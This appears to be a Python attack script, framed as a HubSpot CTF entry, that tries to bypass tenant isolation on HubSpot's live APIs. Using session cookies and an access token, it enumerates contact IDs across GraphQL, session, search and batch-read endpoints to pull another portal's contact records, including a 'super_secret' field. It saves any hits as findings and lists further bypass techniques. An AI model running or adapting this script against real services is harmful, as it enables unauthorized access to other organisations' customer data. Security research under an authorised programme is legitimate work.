#!/usr/bin/env python3
"""
Comprehensive CTF Attack Script
Tests multiple attack vectors simultaneously
"""

import requests
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from dotenv import load_dotenv

load_dotenv()

# Configuration
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*70)
print(" HubSpot CTF Comprehensive Attack Script")
print("="*70)
print(f"Target Portal: {TARGET_PORTAL}")
print(f"My Portal: {MY_PORTAL}")
print(f"Access Token: {ACCESS_TOKEN[:20] if ACCESS_TOKEN else 'MISSING'}...")
print(f"Session Cookies: {'LOADED' if SESSION_COOKIES else 'MISSING'}")
print("="*70)

findings = []

def log_finding(attack_type, details, response_data):
    """Log any interesting findings"""
    finding = {
        'attack_type': attack_type,
        'details': details,
        'response': response_data
    }
    findings.append(finding)
    print(f"\n POTENTIAL FINDING!")
    print(f"Attack: {attack_type}")
    print(f"Details: {details}")
    print(f"Response: {json.dumps(response_data, indent=2)[:500]}")
    print("="*70)

# ============================================================================
# 1. GRAPHQL ATTACKS (Without Scope - Using Session Cookies)
# ============================================================================

def test_graphql_endpoints():
    """Test GraphQL endpoints without requiring scope"""
    print("\n[*] Testing GraphQL endpoints...")

    if not SESSION_COOKIES:
        print("[-] No session cookies available")
        return

    # Different GraphQL endpoints to try
    graphql_urls = [
        "https://app.hubspot.com/api/graphql/crm",
        "https://app.hubspot.com/graphql",
        "https://api.hubspot.com/graphql",
        "https://api.hubapi.com/graphql",
        "https://app.hubspot.com/api/graphql",
    ]

    # Simple contact query
    query = {
        'query': '''
            query GetContact {
                crmObject(objectId: "1", objectTypeId: "0-1") {
                    objectId
                    properties {
                        name
                        value
                    }
                }
            }
        '''
    }

    headers = {
        'Cookie': SESSION_COOKIES,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    }

    for url in graphql_urls:
        # Try without portalId
        try:
            print(f"  Testing: {url}")
            response = requests.post(url, json=query, headers=headers, timeout=10)
            print(f"    Status: {response.status_code}")

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and data['data']:
                    log_finding("GraphQL - No Portal ID", url, data)
                elif 'errors' in data:
                    print(f"    Errors: {data['errors'][0].get('message', '')[:100]}")
        except Exception as e:
            print(f"    Error: {str(e)[:100]}")

        # Try with target portal ID
        try:
            response = requests.post(
                f"{url}?portalId={TARGET_PORTAL}",
                json=query,
                headers=headers,
                timeout=10
            )
            print(f"    Status (with portalId): {response.status_code}")

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and data['data']:
                    log_finding("GraphQL - With Portal ID", url, data)
        except Exception as e:
            pass

# ============================================================================
# 2. SESSION-BASED API ATTACKS
# ============================================================================

def test_session_api(contact_id):
    """Test session-based APIs with different contact IDs"""
    if not SESSION_COOKIES:
        return None

    session_urls = [
        f"https://app.hubspot.com/api/inbounddb-objects/v1/crm-objects/0-1/{contact_id}?portalId={TARGET_PORTAL}",
        f"https://app.hubspot.com/contacts-app/api/contacts/v1/contact/vid/{contact_id}?portalId={TARGET_PORTAL}",
        f"https://app.hubspot.com/api/crm/v3/objects/contacts/{contact_id}?portalId={TARGET_PORTAL}",
        f"https://app.hubspot.com/api/contacts/v1/contact/vid/{contact_id}/profile?portalId={TARGET_PORTAL}",
    ]

    headers = {
        'Cookie': SESSION_COOKIES,
        'User-Agent': 'Mozilla/5.0'
    }

    for url in session_urls:
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                data = response.json()
                # Check if we got actual data
                if data and 'properties' in json.dumps(data).lower():
                    return {
                        'contact_id': contact_id,
                        'url': url,
                        'data': data
                    }
        except:
            pass

    return None

def test_all_session_apis():
    """Test session APIs for contact IDs 1-100"""
    print("\n[*] Testing session-based APIs for contact IDs 1-100...")

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_session_api, i) for i in range(1, 101)]

        for future in as_completed(futures):
            result = future.result()
            if result:
                log_finding(
                    "Session API - Contact Found",
                    f"Contact ID {result['contact_id']}",
                    result['data']
                )

# ============================================================================
# 3. API TOKEN ATTACKS WITH DIFFERENT ENDPOINTS
# ============================================================================

def test_api_endpoint(endpoint_data):
    """Test a specific API endpoint"""
    contact_id, endpoint_template = endpoint_data

    if not ACCESS_TOKEN:
        return None

    url = endpoint_template.format(
        contact_id=contact_id,
        portal_id=TARGET_PORTAL
    )

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    try:
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data and 'properties' in json.dumps(data).lower():
                return {
                    'contact_id': contact_id,
                    'url': url,
                    'data': data
                }
    except:
        pass

    return None

def test_api_endpoints():
    """Test various API endpoints"""
    print("\n[*] Testing API endpoints with token...")

    endpoint_templates = [
        "https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}?portalId={portal_id}",
        "https://api.hubspot.com/crm/v3/objects/contacts/{contact_id}?portalId={portal_id}",
        "https://api.hubapi.com/contacts/v1/contact/vid/{contact_id}/profile?portalId={portal_id}",
        "https://api.hubspot.com/contacts/v1/contact/vid/{contact_id}/profile?portalId={portal_id}",
    ]

    # Test contact IDs 1-50
    test_cases = [
        (contact_id, template)
        for contact_id in range(1, 51)
        for template in endpoint_templates
    ]

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(test_api_endpoint, case) for case in test_cases]

        for future in as_completed(futures):
            result = future.result()
            if result:
                log_finding(
                    "API Endpoint - Contact Found",
                    f"Contact ID {result['contact_id']}",
                    result['data']
                )

# ============================================================================
# 4. SEARCH ENDPOINT ATTACKS
# ============================================================================

def test_search_endpoints():
    """Test search endpoints with various filters"""
    print("\n[*] Testing search endpoints...")

    if not SESSION_COOKIES:
        print("[-] No session cookies")
        return

    search_payloads = [
        {
            "filterGroups": [],
            "properties": ["firstname", "super_secret", "email"],
            "limit": 100
        },
        {
            "filterGroups": [{
                "filters": [{
                    "propertyName": "hs_object_id",
                    "operator": "GTE",
                    "value": "1"
                }]
            }],
            "properties": ["firstname", "super_secret", "email"],
            "limit": 100
        }
    ]

    search_urls = [
        f"https://app.hubspot.com/api/crm/v3/objects/contacts/search?portalId={TARGET_PORTAL}",
        f"https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={TARGET_PORTAL}",
    ]

    for url in search_urls:
        for payload in search_payloads:
            # Try with session cookies
            try:
                headers = {
                    'Cookie': SESSION_COOKIES,
                    'Content-Type': 'application/json'
                }
                response = requests.post(url, json=payload, headers=headers, timeout=10)
                print(f"  {url.split('/')[-2]}: {response.status_code}")

                if response.status_code == 200:
                    data = response.json()
                    if data.get('results'):
                        log_finding("Search Endpoint - Session", url, data)
            except Exception as e:
                pass

            # Try with access token
            try:
                headers = {
                    'Authorization': f'Bearer {ACCESS_TOKEN}',
                    'Content-Type': 'application/json'
                }
                response = requests.post(url, json=payload, headers=headers, timeout=10)

                if response.status_code == 200:
                    data = response.json()
                    if data.get('results'):
                        log_finding("Search Endpoint - Token", url, data)
            except Exception as e:
                pass

# ============================================================================
# 5. BATCH OPERATIONS
# ============================================================================

def test_batch_operations():
    """Test batch read operations"""
    print("\n[*] Testing batch operations...")

    if not ACCESS_TOKEN:
        return

    batch_urls = [
        "https://api.hubapi.com/crm/v3/objects/contacts/batch/read",
        "https://api.hubspot.com/crm/v3/objects/contacts/batch/read",
    ]

    # Try reading contacts 1-20
    payload = {
        "properties": ["firstname", "super_secret", "email"],
        "inputs": [{"id": str(i)} for i in range(1, 21)]
    }

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    for url in batch_urls:
        try:
            # Add portal ID to URL
            response = requests.post(
                f"{url}?portalId={TARGET_PORTAL}",
                json=payload,
                headers=headers,
                timeout=10
            )
            print(f"  Batch read: {response.status_code}")

            if response.status_code == 200:
                data = response.json()
                if data.get('results'):
                    log_finding("Batch Operation", url, data)
        except Exception as e:
            pass

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    print("\n Starting comprehensive CTF attack...\n")

    # Run all tests
    test_graphql_endpoints()
    test_search_endpoints()
    test_batch_operations()
    test_api_endpoints()
    test_all_session_apis()

    # Summary
    print("\n" + "="*70)
    print(f" Testing complete!")
    print(f"Total findings: {len(findings)}")
    print("="*70)

    if findings:
        print("\n FINDINGS SUMMARY:")
        for i, finding in enumerate(findings, 1):
            print(f"\n{i}. {finding['attack_type']}")
            print(f"   {finding['details']}")
            print(f"   Response preview: {str(finding['response'])[:200]}...")

        # Save findings
        with open('/home/user/Hub/findings/ctf_findings.json', 'w') as f:
            json.dump(findings, f, indent=2)
        print(f"\n Findings saved to: findings/ctf_findings.json")
    else:
        print("\n No successful bypasses found.")
        print("\nNext steps:")
        print("  1. Try race conditions with Burp Turbo Intruder")
        print("  2. Manual testing with Burp Repeater")
        print("  3. Test different parameter encodings")
        print("  4. Research novel HubSpot API endpoints")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
